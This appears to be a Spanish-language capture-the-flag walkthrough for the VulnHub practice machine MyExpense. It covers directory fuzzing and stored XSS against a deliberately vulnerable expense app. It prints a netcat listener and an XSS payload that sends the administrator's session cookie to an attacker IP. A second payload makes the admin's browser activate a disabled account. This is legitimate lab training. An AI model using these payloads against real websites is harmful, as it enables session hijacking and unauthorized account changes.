# MyExpense

- Máquina de vulnhub, para practicar XSS y SQL Injection  
- Descarga: <a href="https://www.vulnhub.com/entry/myexpense-1,405/">MyExpense</a>

### Antecedentes
Tenemos un usuario llamado Samuel, que ha sido despedido de la empresa y le deben todavía 750€ de un viaje que hizo. Para cobrarlo, debemos hacer la solicitud a través de la web pero nuestro usuario ha sido eliminado o deshabilitado. Nuestra misión es intentar loguearnos y conseguir cobrar esa cantidad.  
Your credentials were: samuel/fzghn4lw

### Accediendo a la web
<img src="https://github.com/glmbxecurity/eJPT2_eCCPT2_eWPT_Notes/blob/main/writeups/myexpense/myexpense1.jpg?raw=true">
Introducimos la url en el navegador y vamos al apartado para crear una cuenta. El botón de crear cuenta está bloqueado, así que inspeccionamos el codigo fuente y desbloqueamos el botón eliminando la línea **disabled**

FOTOS 2 Y 3

Intentamos hacer login pero nuestra cuenta está deshabilitada

FOTO 4

### Fuzzing

Hacemos fuzzing con gobuster y encontramos la carpeta admin

FOTO 5

seguimos fuzzeando y encontramos admin.php y accedemos. Vemos que aparece un panel con los datos de usuarios, y Samuel y los usuarios creados están deshabilitados. no se pueden deshabilitar. solo puede un administrador.

FOTO 6


### XSS 
En formulario de creación de usuarios se ha detectado que se puede hacer XSS, con lo que con suerte, podremos robar la cookie de sesión del Administrador.  

Ponemos a la escucha con netcat en kali:  
```
nc -lvp 80
```

Introducimos el siguiente codigo en el formulario, por ejemplo en el campo de apellido:  
```
#XSS Payload
<script>img = new Image(); img.src = "http://192.168.43.57/a.php?"+document.cookie;</script>
```
Hemos recibido la cookie!
FOTO 8

Pero no nos sirve porque no puede estar el administrador logueado en 2 equipos distintos a la vez. Así que hay que forzar a que el administrador utilice el botón para activar el usuario.  
Si nos fijamos al clicar el boton, es simplemente una acción que lleva a una URL, probaremos a meter esa url en el código XSS
Para ello volvemos a crear otro usuario y en el apellido, por ejemplo. Metemos el siguiente código:  

```
# XSS Payload
<script>document.write('<img src="http://192.168.56.104/admin/admin.php?id=11&status=active"/>');</script>

```
FOTO 9
esperamos un poco y voilá! se activó!
FOTO 10

